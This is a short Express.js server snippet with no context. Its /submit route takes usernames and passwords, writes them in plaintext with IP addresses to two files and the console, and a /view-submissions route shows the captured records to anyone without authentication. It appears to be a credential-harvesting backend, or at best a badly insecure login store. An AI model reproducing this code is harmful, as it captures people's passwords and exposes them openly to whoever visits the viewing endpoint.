app.post('/submit', (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  const entry = { username, password, time: new Date().toISOString(), ip: req.ip };

  // Debug file
  fs.appendFile('debug_submissions.txt', JSON.stringify(entry) + '\n', err => {
    if (err) console.error('Debug write error:', err);
  });

  // Main submissions file
  fs.appendFile(OUTFILE, JSON.stringify(entry) + '\n', err => {
    if (err) {
      console.error('Write error:', err);
      return res.status(500).json({ error: 'Could not save submission' });
    }
    console.log('Saved submission (raw):', entry);
    res.json({ success: true });
  });
});app.get('/view-submissions', (req, res) => {
  fs.readFile('debug_submissions.txt', 'utf8', (err, data) => {
    if(err) return res.send('No submissions yet.');
    res.type('text').send(data.replace(/\n/g, '<br>'));
  });
});
